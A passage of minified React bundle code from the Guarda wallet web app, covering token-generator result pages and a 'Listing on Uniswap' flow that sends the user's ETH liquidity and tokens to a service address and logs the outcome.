            }), O.createElement("span", null, "Congrats,", " ", t, " ", "is created!")), O.createElement("div", {
                className: Cse
            }, O.createElement("p", null, null == l ? void 0 : l.text, O.createElement("br", null), O.createElement("a", {
                target: "_blank",
                rel: "noopener noreferrer",
                href: null == l ? void 0 : l.link
            }, e), ".", O.createElement("br", null), "You can always check transaction history here."), O.createElement("div", {
                className: wse
            }, O.createElement("img", {
                className: Nse,
                alt: "",
                src: yse
            })))), O.createElement("div", {
                className: Ht()("col-xs-4 col-xs-offset-1", Ase)
            }, O.createElement("p", null, a, " ", "is supported in", " ", O.createElement("a", {
                target: "_blank",
                rel: "noopener noreferrer",
                href: "https://guarda.co/app"
            }, "Guarda wallet"), ". You can send/receive tokens and check transaction history there."), O.createElement("div", {
                className: Sse
            }, O.createElement(Yl, {
                color: "blue",
                onClick: goToGuarda
            }, "Go to Guarda")), n === PW.eth && O.createElement(O.Fragment, null, O.createElement("h4", null, "What can I do with my token?"), O.createElement("p", null, "Try placing the token on an exchange, such as Uniswap. We are here to help you with the token listing."), O.createElement("div", {
                className: Sse
            }, O.createElement(Y.OL, {
                to: "/app/uniswap-listing",
                replace: !0
            }, O.createElement(Yl, {
                color: "blue"
            }, "List on Uniswap"))))), O.createElement(stepper, {
                step: 4
            }))
        }
        const xse = a.p + "40a02a4c5d1280955ef0ab1f0e6a873c.svg"
          , Ise = "error_iconError_37mpN"
          , Pse = "error_titleError_2jJyp"
          , Lse = O.memo(( () => O.createElement(O.Fragment, null, O.createElement("div", {
            className: "col-xs-4 col-xs-offset-4"
        }, O.createElement("div", {
            className: Ise
        }, O.createElement("img", {
            src: xse,
            alt: ""
        }), O.createElement("br", null), O.createElement("div", {
            className: Pse
        }, "Ooops..."), O.createElement("br", null), O.createElement("p", null, "Something went wrong. We’re already solving the issue. Please, contact our support on  ", O.createElement("a", {
            href: "https://support.guarda.com",
            target: "_blank",
            rel: "noreferrer noopener"
        }, "support@guarda.com")))))));
        function ResetStatePage() {
            const e = (0,
            $.I0)()
              , t = (0,
            j.k6)()
              , a = (0,
            $.v9)(oe.Oj)
              , n = (0,
            $.v9)(oe.Yq)
              , r = !a || !n
              , l = (0,
            O.useCallback)(( () => {
                t.replace({
                    pathname: "/app/token-generator"
                })
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                async function run() {
                    if (r)
                        return;
                    const a = await e(getSecureData(je));
                    if (a && a.token) {
                        await e(setSecureData(je, null));
                        const {name: n, symbol: r, type: l} = a.token
                          , {network: s} = a;
                        e(Wre(null));
                        t.replace({
                            pathname: "/app/token-generator",
                            search: objectToString({
                                tokenType: `${s}_${l}`.toLowerCase(),
                                name: n,
                                symbol: r
                            })
                        })
                    } else
                        l()
                }
                run()
            }
            ), [e, l, t, r]);
            return O.createElement(lle, null)
        }
        const routes = () => O.createElement(j.rs, null, O.createElement(j.AW, {
            exact: !0,
            path: "/app/token-generator",
            component: ile
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/token-generator/options",
            component: gle
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/token-generator/payment",
            component: Dle
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/token-generator/process",
            component: gse
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/token-generator/success",
            component: CreateTokenSuccess
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/token-generator/error",
            component: Lse
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/token-generator/reset",
            component: ResetStatePage
        }))
          , Fse = undefined
          , token_generator_router = () => O.createElement("div", {
            className: "container"
        }, O.createElement("div", {
            className: "row"
        }, O.createElement("div", {
            className: "col-xs-12"
        }, O.createElement("div", {
            className: Qne
        }, O.createElement(routes, null)))))
          , Wse = undefined
          , token_generator = () => O.createElement("div", {
            className: Xne
        }, O.createElement(components_header, null), O.createElement(token_generator_router, null), O.createElement(Footer_Footer, null))
          , uniswap_listing_components_header = () => O.createElement("div", {
            className: pk
        }, O.createElement("div", {
            className: "container"
        }, O.createElement("div", {
            className: fk
        }, O.createElement("div", {
            className: yk
        }, O.createElement(Y.OL, {
            to: "/app",
            className: Ek
        }, O.createElement("img", {
            width: "35",
            height: "40",
            src: Fk,
            alt: "Guarda web wallets"
        })), O.createElement("span", {
            className: Ht()(bk, vk)
        }, "Listing on Uniswap")), O.createElement("nav", {
            className: Ht()(gk)
        }, O.createElement(zk, null), O.createElement(back_to_guarda, null)))))
          , Rse = "stepper_stepper_1HcKP"
          , Bse = "stepper_wrapper_3ULTo"
          , Ose = "stepper_line_aFkNv"
          , Dse = "stepper_title_1BgMq"
          , Mse = "stepper_isActive_20_je"
          , Use = "stepper_circle_34vfI"
          , components_stepper = e => {
            let {step: t} = e;
            const getClass = e => Ht()(Use, {
                [Mse]: e <= t
            })
              , renderTitle = (e, a) => O.createElement("h3", {
                className: Ht()(Dse, {
                    [Mse]: a <= t
                })
            }, e);
            return O.createElement("div", null, O.createElement("div", {
                className: "col-xs-12"
            }, O.createElement("div", {
                className: Rse
            }, O.createElement("div", {
                className: Bse
            }, renderTitle("STEP 1. Data input", 1), O.createElement("div", {
                className: getClass(1)
            })), O.createElement("div", {
                className: Bse
            }, renderTitle("STEP 2. Confirmation", 2), O.createElement("div", {
                className: getClass(2)
            })), O.createElement("div", {
                className: Bse
            }, renderTitle("STEP 3. Deploy", 3), O.createElement("div", {
                className: getClass(3)
            })), O.createElement("div", {
                className: Ose
            }))))
        }
          , Gse = {
            wrapper: "options_wrapper_1_c4Q",
            textBlock: "options_textBlock_3-_Ko",
            wrapperForSelector: "options_wrapperForSelector_3SejH",
            errorInput: "options_errorInput_2qNr0",
            inputWrapperClassName: "options_inputWrapperClassName_MeY0A buy-sell_inputWrapperClassName_1Kfhn",
            confirmBlock: "options_confirmBlock_2-djX",
            title: "options_title_3nYCu",
            iconCheck: "options_iconCheck_1HZPZ",
            iconInfo: "options_iconInfo_1oBb1",
            infoPlaceholderWrapper: "options_infoPlaceholderWrapper_OI8JC",
            listItem: "options_listItem_2EyRH",
            tokenBlock: "options_tokenBlock_3K38G",
            inputAmountToken: "options_inputAmountToken_Y8W-O",
            tokenPriceBlock: "options_tokenPriceBlock_TKxCA",
            tokenPrice: "options_tokenPrice_1rX3q",
            buttonsBlock: "options_buttonsBlock_XyAWk",
            feeInfoBlock: "options_feeInfoBlock_3WWRF",
            feeInfo: "options_feeInfo_2Gsml",
            equivalent: "options_equivalent_1-wmF",
            amount: "options_amount_3gndP",
            topUpWalletLink: "options_topUpWalletLink_2cQRf",
            loaderWrapper: "options_loaderWrapper_2EUGu"
        }
          , Vse = a.p + "assets/images/DMj5lH8.png"
          , Kse = a.p + "assets/images/2tIWyVO.png"
          , Hse = M.CM ? "10" : "2000"
          , zse = M.CM ? "ropsten" : "eth"
          , jse = {
            currency: zse,
            address: M.CM ? "0xbbeda1EDC21cbAE1b94064AB7606399C3887edA5" : "0x329658aC786cF8c01130E0D51aeD44aE7A2E2D86"
        };
        function OptionsTokenListingPage() {
            const e = (0,
            j.k6)()
              , t = (0,
            $.I0)()
              , a = O.createRef()
              , {convertToFiat: n, convertToCrypto: r} = useConverter()
              , {localCurrency: l} = local_currency_useLocalCurrency()
              , [s,i] = (0,
            O.useState)(!0)
              , [o,c] = (0,
            O.useState)(null)
              , [u,d] = (0,
            O.useState)(0)
              , [m,p] = (0,
            O.useState)("")
              , [f,E] = (0,
            O.useState)("")
              , [h,g] = (0,
            O.useState)("")
              , [y,v] = (0,
            O.useState)(0)
              , [_,w] = (0,
            O.useState)(0)
              , [b,k] = (0,
            O.useState)(null)
              , [S,C] = (0,
            O.useState)(null)
              , [N,T] = (0,
            O.useState)(0)
              , [A,x] = (0,
            O.useState)("")
              , [I,P] = (0,
            O.useState)(0)
              , [L,F] = (0,
            O.useState)("")
              , [W,R] = (0,
            O.useState)(!1)
              , [B,D] = (0,
            O.useState)(!1)
              , M = undefined
              , U = (0,
            $.v9)($c).filter((e => {
                let {currency: t, watchOnly: a} = e;
                return t === zse && !a
            }
            ))
              , G = {
                ...S,
                currency: "eth"
            }
              , [V] = use_fee(b, jse, (0,
            Ko.y4)(y || 0), {
                extraId: y
            })
              , K = r(Hse, G, "usd")
              , H = (0,
            O.useCallback)((e => v(e)), [])
              , z = (0,
            O.useCallback)((e => x(e)), [])
              , handleContinue = () => {
                const {isValid: t} = a.current.validate();
                t ? B || e.push({
                    pathname: "/app/uniswap-listing/confirm",
                    search: objectToString({
                        tokenTitle: m,
                        tokenCurrency: f,
                        tokenSmartContract: h,
                        tokenAmount: y,
                        ethAmount: A,
                        tokenPrice: o,
                        equivalentFiat: L,
                        fromWallet: S.uuid,
                        fromTokenWallet: b.uuid
                    })
                }) : R(!0)
            }
            ;
            (0,
            O.useEffect)(( () => {
                if ("ERC20_TOKEN" === (null == b ? void 0 : b.type)) {
                    const {title: e, currency: t, balance: a, smartContract: n} = b;
                    R(!1);
                    i(!0);
                    d(a);
                    g(n);
                    E(t);
                    p(e);
                    v("");
                    x("")
                }
                if ("ETH_LIKE_WALLET" === (null == b ? void 0 : b.type)) {
                    d("");
                    T("");
                    v("");
                    x("");
                    i(!1)
                }
                const e = U.find((e => e.address === (null == b ? void 0 : b.address)));
                C(e);
                T(null == e ? void 0 : e.balance)
            }
            ), [b]);
            (0,
            O.useEffect)(( () => {
                if (A && G) {
                    const e = n(A, G);
                    F(e)
                }
            }
            ), [S, A]);
            const Z = `https://info.uniswap.org/token/${h}`
              , createAmountValidateObject = e => {
                const t = {
                    precision: (null == b ? void 0 : b.precision) >= 0 ? null == b ? void 0 : b.precision : null,
                    min: null
                };
                return e ? Object.assign(t, {
                    available: N,
                    max: N || null,
                    precision: 18
                }) : Object.assign(t, {
                    available: u,
                    max: u || null
                })
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (f && (0,
                Ko.gt)(A, "0") && (0,
                Ko.gt)(y, "0")) {
                    const e = (0,
                    Ko.hC)(A, y).toString();
                    c(e)
                }
                y && w(V)
            }
            ), [A, y, V]);
            (0,
            O.useEffect)(( () => {
                const e = (0,
                Ko.PD)(K, A).toString()
                  , t = (0,
                Ko.PD)(e, _).toString()
                  , a = !!(0,
                Ko.gt)(t, null == S ? void 0 : S.balance);
                D(a);
                P(t)
            }
            ), [A, null == S ? void 0 : S.balance, _]);
            const goToReceive = a => async () => {
                await t(updateWalletsBalanceAndTxs(a, {
                    isCascade: !1
                }));
                await t(setActiveWallet(a));
                e.push("/app/receive")
            }
            ;
            (0,
            O.useEffect)(( () => {
                let e;
                null != S && S.balance && K && (e = (0,
                Ko.h9)(null == S ? void 0 : S.balance, K).toString());
                null != S && S.balance && _ && (e = (0,
                Ko.h9)(e, _).toString());
                e = (0,
                Ko.gt)(e, "0") ? e : "0";
                T(e)
            }
            ), [null == S ? void 0 : S.balance, K, b, _]);
            return O.createElement(sf(), {
                ref: a
            }, O.createElement("div", {
                className: Gse.wrapper
            }, O.createElement("div", {
                className: "col-xs-6"
            }, O.createElement("div", {
                className: Gse.title
            }, O.createElement("span", null, "Listing on Uniswap")), O.createElement("div", {
                className: Gse.textBlock
            }, O.createElement("div", {
                className: Gse.tokenBlock
            }, O.createElement("div", {
                className: Gse.inputToken
            }, O.createElement(lf.ValidatorField, {
                rules: zf.ethTokenListing,
                value: b
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && (W || !s),
                    isNewDesign: !0,
                    message: a,
                    className: Gse.errorInput,
                    top: -56,
                    right: 35
                }, O.createElement(InputValueAndSelect_InputValueAndSelect, {
                    title: "Select your token",
                    noWidth: !0,
                    value: y,
                    onChange: H,
                    customWrapper: Gse.wrapperForSelector,
                    fiat: b && b.currency
                }, O.createElement(Mh, {
                    isNewStyles: !0,
                    noTicker: !0,
                    newArrow: !0,
                    isNoBorder: !0,
                    inputWrapperClassName: Gse.inputWrapperClassName,
                    placeholder: "Select your token",
                    selectedWallet: b,
                    wallets: U,
                    onChange: k
                })))
            }
            )))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available ", f.toUpperCase(), ":"), u ? O.createElement(MiskInfoValue, {
                disabled: !u,
                onClick: () => v((0,
                Ko.y4)(u))
            }, (0,
            Ko.yF)(u), " ", (0,
            be.xG)(f)) : "-"), O.createElement("div", {
                style: {
                    position: "relative"
                }
            }, O.createElement(lf.ValidatorField, {
                value: (0,
                Ko.y4)(A),
                rules: zf.amount(createAmountValidateObject(A))
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && W,
                    message: a,
                    isNewDesign: !0,
                    className: Gse.errorInput,
                    top: -56,
                    right: 35
                }, O.createElement(InputValueAndSelect_InputValueAndSelect, {
                    noChildren: !0,
                    title: "Amount of liquidity",
                    noWidth: !0,
                    fiat: "eth",
                    value: A,
                    onChange: z,
                    customWrapper: Gse.wrapperForSelector
                }, A && O.createElement("div", {
                    className: Gse.equivalent
                }, "≈ ", (0,
                Ko.i1)(L, 2), " ", (0,
                be.xG)(l))))
            }
            ))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available ETH (minus fee):"), N && s ? O.createElement(MiskInfoValue, {
                disabled: !N,
                onClick: () => x((0,
                Ko.y4)(N))
            }, (0,
            Ko.yF)(N, 18), " ETH.") : "-")), B && s && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ETH balance to send liquidity and pay the fee.", O.createElement("br", null), "You need: ", (0,
            Ko.yF)(I, 18), " ETH.", O.createElement("br", null), "Available ETH balance: ", null == S ? void 0 : S.balance, " ETH.", O.createElement("br", null), O.createElement("a", {
                className: Gse.topUpWalletLink,
                onClick: goToReceive(S)
            }, "Top up your wallet")), O.createElement("div", {
                className: Gse.tokenPriceBlock
            }, f && (0,
            Ko.gt)(A, "0") && (0,
            Ko.gt)(y, "0") && O.createElement("div", {
                className: Gse.tokenPrice
            }, "1 ", f.toUpperCase(), "(ETH) = ", (0,
            Ko.i1)(o, 13), " ETH")), O.createElement("div", {
                className: Gse.buttonsBlock
            }, O.createElement("div", {
                className: Gse.feeInfoBlock
            }, O.createElement("img", {
                src: Kse,
                alt: "",
                className: Gse.iconInfo
            }), O.createElement("div", {
                className: Gse.feeInfo
            }, O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Fee:"), K && s ? O.createElement(MiskInfoValue, {
                disabled: !1
            }, (0,
            Ko.yF)(_ ? (0,
            Ko.PD)(K, _).toString() : K, 18), "ETH (", O.createElement(fiat_estimate_FiatEstimate, {
                value: n((0,
                Ko.FH)(_ ? (0,
                Ko.PD)(K, _).toString() : K, {
                    max: 6
                }), G)
            }), (0,
            be.xG)(l), ")") : "-"))), O.createElement("div", {
                className: Gse.confirmBlock
            }, O.createElement(Yl, {
                color: "blue",
                size: "large",
                onClick: handleContinue
            }, "Next")))), O.createElement("div", {
                className: Ht()("col-xs-4", Gse.infoPlaceholderWrapper)
            }, O.createElement("p", null, "Uniswap is a decentralized cryptocurrency exchange that runs on Ethereum smart contracts. Guarda will help you make your token a part of DeFi. Useful to know:"), O.createElement("ul", null, O.createElement("li", {
                className: Gse.listItem
            }, O.createElement("img", {
                src: Vse,
                alt: "",
                className: Gse.iconCheck
            }), O.createElement("p", null, "Anyone can list their token on Uniswap, providing liquidity in ETH, as the value proof of the token. If you put 1 ETH and 1000 your tokens, your token price is 1/1000 = 0.001 ETH.")), O.createElement("li", {
                className: Gse.listItem
            }, O.createElement("img", {
                src: Vse,
                alt: "",
                className: Gse.iconCheck
            }), O.createElement("p", null, "You can take back your token and liquidity on the initial ETH address. Just write us at", " ", O.createElement("a", {
                href: "https://support.guarda.com",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "support@guarda.com"), ".")), O.createElement("li", {
                className: Gse.listItem
            }, O.createElement("img", {
                src: Vse,
                alt: "",
                className: Gse.iconCheck
            }), O.createElement("p", null, "We will list your token on Uniswap within 24 hours after receiving your transaction. So, after 24 hours you can check your token price", " ", O.createElement("a", {
                href: Z,
                target: "_blank",
                rel: "noreferrer noopener"
            }, "there"), ".")), O.createElement("li", {
                className: Gse.listItem
            }, O.createElement("img", {
                src: Vse,
                alt: "",
                className: Gse.iconCheck
            }), O.createElement("p", null, "The price estimate is based on the given data. Also, it will depend on the liquidity amount on Uniswap and volume of Trade."))), O.createElement("a", {
                href: "https://support.guarda.com/getting-started/how-to-list-your-token-on-uniswap-using-guarda-wallet",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Learn more in our Support Center.")), O.createElement(components_stepper, {
                step: 1
            })))
        }
        const $se = {
            wrapper: "confirm_wrapper_YRaV4",
            confirmBlock: "confirm_confirmBlock_8vSS3",
            textBlock: "confirm_textBlock_st9b3",
            iconCheck: "confirm_iconCheck_HyMJy",
            infoPlaceholderWrapper: "confirm_infoPlaceholderWrapper_32GUz",
            title: "confirm_title_12bo3",
            listItem: "confirm_listItem_2Z1AI",
            loaderWrapper: "confirm_loaderWrapper_W8mN-",
            buttons: "confirm_buttons_HX4sM",
            updateBalanceLink: "confirm_updateBalanceLink_3xTKV"
        };
        let Zse = !1;
        function ConfirmationPage() {
            const e = (0,
            j.k6)()
              , t = (0,
            $.I0)()
              , a = useLocationSearch()
              , {localCurrency: n} = local_currency_useLocalCurrency()
              , r = (0,
            $.v9)(eu)
              , {convertToCrypto: l} = useConverter()
              , [s,i] = (0,
            O.useState)(null)
              , [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)(null)
              , [m,p] = (0,
            O.useState)(!0)
              , [f,E] = (0,
            O.useState)(!1)
              , [h,g] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)(( () => {
                h && handleConfirm()
            }
            ), [h]);
            const {tokenTitle: y, tokenCurrency: v, tokenSmartContract: _, tokenAmount: w, ethAmount: b, tokenPrice: k, fromWallet: S, fromTokenWallet: C, equivalentFiat: N} = a
              , T = r(S)
              , A = r(C)
              , x = {
                ...T,
                currency: "eth"
            }
              , I = l(Hse, x, "usd")
              , P = (0,
            Ko.PD)(I, b).toString()
              , [,,,,L] = use_fee(T, jse, (0,
            Ko.y4)(b || 0), {
                extraId: b
            });
            (0,
            O.useEffect)(( () => {
                t(updateWalletsBalanceAndTxs(T, {
                    isCascade: !1
                }))
            }
            ), []);
            const F = !!(0,
            Ko.gt)(P, null == T ? void 0 : T.balance)
              , setProcess = async e => {
                i(e);
                return new Promise((e => setTimeout(e, 200)))
            }
              , handleUpdateBalance = e => async () => {
                await setProcess("Updating wallet balance...");
                await t(updateWalletsBalanceAndTxs(e, {
                    isCascade: !1
                }));
                await setProcess(null)
            }
            ;
            async function handleConfirmWallet() {
                await setProcess(`Loading ${(0,
                be.xG)(T.currency)} Blockchain adapter...`);
                await setProcess("Preparing transaction...");
                await setProcess("Broadcasting transaction to network...");
                const t = {
                    token: {
                        smartContract: _,
                        title: y,
                        currency: v,
                        amount: w,
                        price: k
                    },
                    parentWalletAddress: null == T ? void 0 : T.address,
                    amountOfEth: b,
                    totalSendAmount: P,
                    commission: I
                };
                try {
                    const a = await Se.Z.getApiByWallet(T);
                    let n = await a.getNonce({
                        addressFrom: T.address
                    });
                    n = parseInt(n.toString(), 16);
                    const r = await tM.send("send", T, jse, T, {
                        amount: P,
                        isFeeIncluded: !0,
                        extraId: b,
                        gasPrice: null == L ? void 0 : L.gasPrice
                    });
                    if (r.error) {
                        d(r.error);
                        try {
                            Object.assign(t, {
                                liquiditySendError: r.error
                            });
                            await U.nW.post("/api/v1/internal/uniswap-listing/log", t)
                        } catch (e) {
                            console.info(e)
                        }
                        Zse = !1;
                        return
                    }
                    const l = await tM.send("send", A, jse, T, {
                        amount: w,
                        isFeeIncluded: !0,
                        gasPrice: null == L ? void 0 : L.gasPrice,
                        nonce: n + 1
                    });
                    if (l.error) {
                        d(l.error);
                        try {
                            Object.assign(t, {
                                liquiditySendHash: r.hash,
                                tokenSendError: l.error
                            });
                            await U.nW.post("/api/v1/internal/uniswap-listing/log", t)
                        } catch (e) {
                            console.info(e)
                        }
                        Zse = !1;
                        return
                    }
                    if (r.hash && l.hash) {
                        try {
                            Object.assign(t, {
                                liquiditySendHash: r.hash,
                                tokenSendHash: l.hash
                            });
                            await U.nW.post("/api/v1/internal/uniswap-listing/log", t)
                        } catch (e) {
                            console.log("error save to db", e.response || e)
                        }
                        e.replace({
                            pathname: "/app/uniswap-listing/success",
                            search: objectToString({
                                tokenAmount: w,
                                tokenCurrency: v,
                                tokenSmartContract: _,
                                hashLiquiditySend: r.hash,
                                hashTokenSend: l.hash,
                                wallet: T.uuid,
                                ethAmount: b,
                                equivalentFiat: N,
                                commission: I
                            })
                        })
                    }
                } catch (e) {
                    d("Transaction failed");
                    console.info("send tokens fail", e);
                    Zse = !1;
                    Object.assign(t, {
                        tokenSendError: e.message
                    });
                    await U.nW.post("/api/v1/internal/uniswap-listing/log", t)
                }
            }
            async function handleConfirm() {
                if (m)
                    E(!0);
                else if (!Zse && (+P || 0 === P)) {
                    Zse = !0;
                    console.log("start");
                    d(null);
                    await setProcess("Updating wallet balance...");
                    try {
                        await t(updateWalletsBalanceAndTxs(T, {
                            isCascade: !1
                        }))
                    } catch (e) {}
                    await handleConfirmWallet()
                }
            }
            function handleUnlockForm(e, t) {
                p(e);
                E(!1);
                t && g(!0)
            }
            (0,
            O.useEffect)(( () => {
                if (u) {
                    Zse = !1;
                    setProcess(null);
                    c(!1)
                }
            }
            ), [u]);
            (0,
            O.useEffect)(( () => {
                s && !o && c(!0);
                if (!s) {
                    Zse = !1;
                    c(!1)
                }
            }
            ), [s]);
            const W = `https://info.uniswap.org/token/${_}`;
            return O.createElement("div", {
                className: $se.wrapper
            }, O.createElement(LockPasswordLabel, {
                params: a,
                back: "/app/uniswap-listing/confirm",
                showLockPasswordLabel: f,
                onChangeStatus: handleUnlockForm
            }), O.createElement("div", {
                className: "col-xs-12"
            }, O.createElement(BackButton, {
                className: $se.backButton
            })), O.createElement("div", {
                className: Ht()($se.wrapperForm, {
                    [$se.lock]: m && f
                })
            }, O.createElement("div", {
                className: "col-xs-6"
            }, O.createElement("div", {
                className: $se.title
            }, O.createElement("span", null, "Listing on Uniswap")), O.createElement("div", {
                className: $se.textBlock
            }, O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Your token:"), O.createElement(ConfirmInfoValue, null, y, " (", (0,
            be.xG)(v), ")")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Amount of liquidity:"), O.createElement(ConfirmInfoValue, null, O.createElement("span", null, b), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)("eth")), O.createElement(ConfirmInfoSubValue, null, "≈ ", O.createElement(fiat_estimate_FiatEstimate, {
                value: N
            }), " ", (0,
            be.xG)(n)))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Amount of your token:"), O.createElement(ConfirmInfoValue, null, w, " ", (0,
            be.xG)(v))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Token Price:"), O.createElement(ConfirmInfoValue, null, "1 ", null == v ? void 0 : v.toUpperCase(), " = ", k, " ETH")), F && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)(T.currency), " Balance.", O.createElement("br", null), "Available balance: ", T.balance, " ", (0,
            be.xG)(T.currency), O.createElement("br", null), O.createElement("a", {
                className: $se.updateBalanceLink,
                onClick: handleUpdateBalance(T)
            }, "Update wallet balance")), u && O.createElement(bf, {
                error: u
            })), O.createElement("div", {
                className: $se.buttons
            }, O.createElement("div", {
                className: $se.confirmBlock
            }, F ? O.createElement(Yl, {
                color: "blue",
                size: "large",
                disabled: !0
            }, "Confirm") : O.createElement(Yl, {
                color: "blue",
                size: "large",
                onClick: handleConfirm
            }, "Confirm")), o && O.createElement("div", {
                className: $se.loaderWrapper
            }, s && O.createElement("span", null, s)))), O.createElement("div", {
                className: Ht()("col-xs-4", $se.infoPlaceholderWrapper)
            }, O.createElement("p", null, "Uniswap is a decentralized cryptocurrency exchange that runs on Ethereum smart contracts. Guarda will help you make your token a part of DeFi. Useful to know:"), O.createElement("ul", null, O.createElement("li", {
                className: $se.listItem
            }, O.createElement("img", {
                src: Vse,
                alt: "",
                className: $se.iconCheck
            }), O.createElement("p", null, "Anyone can list their token on Uniswap, providing liquidity in ETH, as the value proof of the token. If you put 1 ETH and 1000 your tokens, your token price is 1/1000 = 0.001 ETH.")), O.createElement("li", {
                className: $se.listItem
            }, O.createElement("img", {
                src: Vse,
                alt: "",
                className: $se.iconCheck
            }), O.createElement("p", null, "You can take back your token and liquidity on the initial ETH address. Just write us at", " ", O.createElement("a", {
                href: "https://support.guarda.com",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "support@guarda.com"), ".")), O.createElement("li", {
                className: $se.listItem
            }, O.createElement("img", {
                src: Vse,
                alt: "",
                className: $se.iconCheck
            }), O.createElement("p", null, "We will list your token on Uniswap within 24 hours after receiving your transaction. So, after 24 hours you can check your token price", " ", O.createElement("a", {
                href: W,
                target: "_blank",
                rel: "noreferrer noopener"
            }, "there"), ".")), O.createElement("li", {
                className: $se.listItem
            }, O.createElement("img", {
                src: Vse,
                alt: "",
                className: $se.iconCheck
            }), O.createElement("p", null, "The price estimate is based on the given data. Also, it will depend on the liquidity amount on Uniswap and volume of Trade."))), O.createElement("a", {
                href: "https://support.guarda.com/getting-started/how-to-list-your-token-on-uniswap-using-guarda-wallet",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Learn more in our Support Center."))), O.createElement(components_stepper, {
                step: 2
            }))
        }
        const Yse = a.p + "11ac9589ffe02c9b31e362a8339ff257.svg"
          , qse = a.p + "assets/images/16YkrYD.png"
          , Xse = "success_wrapper_3gf3z"
          , Qse = "success_confirmBlock_rVGvI"
          , Jse = "success_textBlock_2hjeO"
          , eie = "success_infoBlock_f9FVJ"
          , tie = "success_copyHashBlock_2gkG-"
          , aie = "success_buttonAction_330-Z"
          , nie = "success_copyBlock_21vI_"
          , rie = "success_iconCheck_1frtH"
          , lie = "success_infoPlaceholderWrapper_HGhug"
          , sie = "success_imagePlaceholderWrapper_1iDtT"
          , iie = "success_title_3Q9mY"
          , oie = "success_listItem_2lnXa"
          , cie = "success_imageSuccess_1dH2q"
          , uie = "success_amountOfLiquidityBlock_fuyo_"
          , die = "success_buttons_Lz0tO"
          , mie = "success_tokenCurrencyTicker_1QRK_";
        function SuccessPage() {
            const e = (0,
            j.k6)()
              , t = (0,
            j.TH)()
              , {localCurrency: a} = local_currency_useLocalCurrency()
              , n = (0,
            $.v9)(eu)
              , {tokenAmount: r, tokenCurrency: l, tokenSmartContract: s, hashLiquiditySend: i, hashTokenSend: o, wallet: c, equivalentFiat: u, ethAmount: d, commission: m} = stringToObject(t.search)
              , p = n(c)
              , getLink = e => c ? (0,
            be.Kb)(null == p ? void 0 : p.family, null == p ? void 0 : p.currency, e) : ""
              , goToGuarda = () => e.push({
                pathname: "/app"
            })
              , f = `https://info.uniswap.org/token/${s}`
              , E = getLink(o)
              , h = getLink(i);
            return O.createElement("div", {
                className: Xse
            }, O.createElement("div", {
                className: Ht()("col-xs-6", lie)
            }, O.createElement("div", {
                className: iie
            }, O.createElement("span", null, "Listing is successful!")), O.createElement("div", {
                className: Jse
            }, "We will list your token on Uniswap within 24 hours after receiving your transaction. So, after 24 hours you can check your token price", " ", O.createElement("a", {
                href: f,
                target: "_blank",
                rel: "noreferrer noopener"
            }, "there"), "."), O.createElement("div", {
                className: eie
            }, O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Amount of your token:"), O.createElement(ConfirmInfoValue, null, r, " ", O.createElement("span", {
                className: mie
            }, (0,
            be.xG)(l)))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Amount of liquidity:"), O.createElement(ConfirmInfoValue, null, O.createElement("div", {
                className: uie
            }, d, " ETH", O.createElement(ConfirmInfoSubValue, null, "≈ ", O.createElement(fiat_estimate_FiatEstimate, {
                value: u
            }), " ", (0,
            be.xG)(a))))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network fee:"), O.createElement(ConfirmInfoValue, null, m, " ETH")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Token sent:"), O.createElement(ConfirmInfoValue, null, O.createElement("div", {
                className: tie
            }, O.createElement("a", {
                href: E,
                target: "_blank",
                rel: "noreferrer noopener"
            }, formatAddress(o, 10)), O.createElement(button_copy, {
                text: o,
                className: aie
            }, (e => e ? O.createElement("span", null, "copied") : O.createElement("img", {
                src: qse,
                alt: ""
            })))))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Liquidity sent:"), O.createElement(ConfirmInfoValue, null, O.createElement("div", {
                className: tie
            }, O.createElement("a", {
                href: h,
                target: "_blank",
                rel: "noreferrer noopener"
            }, formatAddress(i, 10)), O.createElement(button_copy, {
                text: i,
                className: aie
            }, (e => e ? O.createElement("span", null, "copied") : O.createElement("img", {
                src: qse,
                alt: ""
            }))))))), O.createElement(ui_message, {
                type: "warning"
            }, "Please wait until the transactions are confirmed in the Network before making new operations with this ETH wallet. You can check the status on the History tab."), O.createElement("div", {
                className: die
            }, O.createElement(Yl, {
                color: "blue",
                onClick: goToGuarda
            }, "Go to History"))), O.createElement("div", {
                className: Ht()("col-xs-4", sie)
            }, O.createElement("img", {
                src: Yse,
                alt: "",
                className: cie
            })), O.createElement(components_stepper, {
                step: 3
            }))
        }
        const pie = "uniswap-listing_pageBackground_UC3em app_pageBackground_2Jmxb"
          , fie = "uniswap-listing_wrapper_1l53A"
          , Eie = "uniswap-listing_backButton_2-jrA"
          , uniswap_listing_router = () => O.createElement("div", {
            className: "container"
        }, O.createElement("div", {
            className: "row"
        }, O.createElement("div", {
